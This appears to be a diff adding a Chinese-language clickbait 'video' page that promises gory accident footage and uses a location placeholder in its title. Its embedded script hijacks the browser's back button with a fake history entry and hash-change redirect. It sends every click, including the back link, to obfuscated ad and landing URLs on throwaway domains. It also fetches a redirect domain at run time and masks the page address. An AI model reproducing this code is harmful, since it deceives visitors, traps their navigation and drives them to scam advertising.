@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta
+            name="viewport"
+            content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>.</title>
+    <link rel="stylesheet" href="https://xx2-152.oss-cn-shanghai.aliyuncs.com/xx2-152/longma/static/public/css/index.css" />
+
+
+    <style type="text/css">
+        .back-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 10vw;
+            background: #000000;
+            color: #c38441;
+            font-size: 16px;
+            padding: 0 3vw;
+        }
+    </style>
+
+</head>
+<body class="video-body">
+<div class="back-bar" id="entry">
+    <span id="backbtn" onclick="adback()">&lt; 返回</span>
+    <span onclick="tousu()">投诉<span></span></span>
+</div>
+
+<!-- 视频 -->
+<div class="video-wrap">
+    <div id="mod_player"></div>
+</div>
+
+<!-- 广告 -->
+<div id="ad" class="ad-wrap">
+    <div id="ad-url" href="javascript:;" rel="noreferrer" class="ad" onclick="xuanfu()">
+        <img id="ad-img" class="ad" alt=""  />
+    </div>
+</div>
+</body>
+<script src="https://xx2-152.oss-cn-shanghai.aliyuncs.com/xx2-152/longma/static/public/js/zepto.min.js"></script>
+<script>
+    var addizhi = '';
+    window.goal_data = JSON.parse('{"dir":"\/www\/wwwroot\/152.com\/","type":1}'); //twww/wwwroot/152.com/
+    window.video_info = JSON.parse('{"title":"$(dizhi)\u6628\u5929\u4e0b\u534814:38\u53d1\u751f\uff0c\u73b0\u573a\u8840\u8165\uff0c\u5341\u5206\u60e8\u70c8\uff01\uff01\uff01","vid":"k0876bxlzt0","jump_time":"224","cover_pic":"https:\/\/xx2-152.oss-cn-shanghai.aliyuncs.com\/xx2-152\/longma\/static\/upload\/video\/1564050018.jpg"}'); //视频信息
+    window.goal2_url = 'http://w2wkz6sbue.jydt.wxao4.cn/46f5b6d17d1a7023a4034ba7f62e42960e070af27f1a826f9dba9b3e50301a7126d38422857ef5fb9e2a389c4c16a6021c4fb56f3c3206857d73723472048193c05ddf11eea1e88e46d7472bf5cc7ddfa8db20cf5980d3841f88d332dc1366dbc651a34829?type=2&e_wz=1e3a9315a40a1bc428dd853a63072c1de7c4fb140a7fd12441a939687e36b91c77339c138990ec0b22bd4d4685c0704fe475927a8eb0284d9825284acc4556c02c0b3a84bea478a01aa7cc29eb526e490c5553f6e89dde039206372c888a5aefaf4c8f69d184829218e9100618d4ac59e9e1083cc8c964780891e8e94a2023230be9d62e806b2ffe8728d642a02c9dfb6d4456c737a95b43813343be'; //落地二链接
+    window.jump = '0'; //1:继续播放视频
+    window.ad_url = 'http://bx2vdmn.kyjthdf.4j39l4.cn/03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&&_tuitan=1&e_wz=1e3a9315a40a1bc428dd853a63072c1de7c4fb140a7fd12441a939687e36b91c77339c138990ec0b22bd4d4685c0704fe475927a8eb0284d9825284acc4556c02c0b3a84bea478a01aa7cc29eb526e490c5553f6e89dde039206372c888a5aefaf4c8f69d184829218e9100618d4ac59e9e1083cc8c964780891e8e94a2023230be9d62e806b2ffe8728d642a02c9dfb6d4456c737a95b43813343be'; //广告链接
+    window.xf_url = 'http://bx2vdmn.kyjthdf.4j39l4.cn/03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&&xuanfu=longma'; //广告链接
+    if('1' == 1){
+        window.bf_url = 'http://bx2vdmn.kyjthdf.4j39l4.cn/03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&&bfwc';
+    }else{
+        apitz('03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&&bfwc');
+        setTimeout("dengdai()", 500)
+    }
+
+    function dengdai(){
+        window.bf_url = addizhi;
+    }
+
+    function back(backUrl) {
+        if (!backUrl) {
+            return false;
+        }
+        var fn = arguments.callee;
+        if (fn.hasInit) {
+            return false;
+        }
+        fn.hasInit = true;
+        setTimeout(function() {
+            history.pushState(
+                history.length + 1,
+                'back',
+                location.href + '#' + new Date().getTime()
+            );
+        }, 100);
+        window.onhashchange = function() {
+            if('1' == 1){
+                location.href = backUrl;
+            }else{
+                apitz('03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&');
+
+                location.href = addizhi;
+            }
+
+        };
+    }
+
+    /* 返回监听 */
+    back('http://bx2vdmn.kyjthdf.4j39l4.cn/03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&&_tuitan=1&e_wz=1e3a9315a40a1bc428dd853a63072c1de7c4fb140a7fd12441a939687e36b91c77339c138990ec0b22bd4d4685c0704fe475927a8eb0284d9825284acc4556c02c0b3a84bea478a01aa7cc29eb526e490c5553f6e89dde039206372c888a5aefaf4c8f69d184829218e9100618d4ac59e9e1083cc8c964780891e8e94a2023230be9d62e806b2ffe8728d642a02c9dfb6d4456c737a95b43813343be');
+
+    function adback()
+    {
+        if('' == 1){
+            dianji('back');
+        }
+
+        if('1' == 1){
+            location.href = 'http://bx2vdmn.kyjthdf.4j39l4.cn/03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&&_tuitan=1&e_wz=1e3a9315a40a1bc428dd853a63072c1de7c4fb140a7fd12441a939687e36b91c77339c138990ec0b22bd4d4685c0704fe475927a8eb0284d9825284acc4556c02c0b3a84bea478a01aa7cc29eb526e490c5553f6e89dde039206372c888a5aefaf4c8f69d184829218e9100618d4ac59e9e1083cc8c964780891e8e94a2023230be9d62e806b2ffe8728d642a02c9dfb6d4456c737a95b43813343be';
+        }else{
+            apitz('03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&')
+            location.href = addizhi;
+        }
+
+    }
+    function tousu(){
+        if('' == 1){
+            dianji('tousu');
+        }
+        location.href='/bak/tousu/';
+    }
+    function xuanfu()
+    {
+        if('' == 1){
+            dianji('xf');
+        }
+        if('1' == 1){
+            location.href = 'http://bx2vdmn.kyjthdf.4j39l4.cn/03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&&xuanfu=longma';
+        }else{
+            apitz('03c97b22fd526a45df32a2325fa58387a40a8ccc424f04593c8946efd0956550c43e8046d98c3e3af6c44f6feb973ee1e460bacb99e743399fbd3c1dfacbeecfbb04942e5a6f4d677568815eaddfd3?xx2ad&&xuanfu=longma')
+            location.href = addizhi;
+        }
+
+
+    }
+    document.querySelector('#ad-img').src = 'https://xx2-152.oss-cn-shanghai.aliyuncs.com/xx2-152/longma/static/upload/video/1563971572.jpg';
+
+    function dianji(key){
+        $.ajax({
+            type: "GET",
+            url: "2dbdb97f2fdb6915e47f6e270b8c7cad83fd3cbf16523cd66b2a1ab4a159276b0cc21f699a95a611f7813940402198a1974ff6d9702241f9a515467fee5a837436289a28c258fbc51d60745df7dd4c1a3cf8c47dd512e8744ed6821d5afcc8e1967d5d9b04",
+            data: {key:key},
+            dataType: "json",
+            success: function(data){
+
+            }
+        });
+    }
+
+    function apitz(para){
+        //alert(para);
+        $.ajax({
+            type: "GET",
+            url: '/bak/gg/api/api.php',
+            dataType: "json",
+            jsonp: "callback",
+            jsonpCallback: 'callback',
+            success: function (res) {
+                //alert(res.domainname + para)
+                addizhi = res.domainname + para;
+            },
+            error: function (res) {
+                //location.href = 'http://qq.com';
+            }
+        });
+    }
+
+</script>
+<script src="https://xx2-152.oss-cn-shanghai.aliyuncs.com/xx2-152/longma/static/public/js/common.js"></script>
+
+<script src="https://xx2-152.oss-cn-shanghai.aliyuncs.com/xx2-152/longma/static/public/js/config.js"></script>
+<script src="https://xx2-152.oss-cn-shanghai.aliyuncs.com/xx2-152/longma/static/public/js/util.js"></script>
+<script src="https://xx2-152.oss-cn-shanghai.aliyuncs.com/xx2-152/longma/static/public/js/tvp.player_v2_zepto.js"></script>
+<script src="https://xx2-152.oss-cn-shanghai.aliyuncs.com/xx2-152/longma/static/public/js/home3.js"></script>
+<script src="/bak/jiaoben.php"></script>
+<script type="text/javascript">
+    window.history.pushState({},0,'//'+location.host);
+</script>
+</html>
